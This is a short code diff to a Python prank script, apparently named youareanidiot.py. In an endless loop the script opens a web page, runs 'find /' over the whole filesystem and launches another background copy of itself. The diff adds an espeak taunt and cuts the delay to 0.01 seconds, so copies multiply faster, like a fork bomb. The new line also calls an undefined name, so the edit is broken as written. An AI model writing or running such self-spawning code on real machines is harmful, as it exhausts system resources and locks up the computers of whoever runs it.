@@ -6,6 +6,8 @@ while True:
     webbrowser.open(idiot)
     find = 'find /'
     os.system(find)
-    sleep(0.1)
+    speak = 'espeak HAHAHAHAHAHA'
+    os.system(espeak)
+    sleep(0.01)
     py = 'python3 youareanidiot.py &'
     os.system(py)
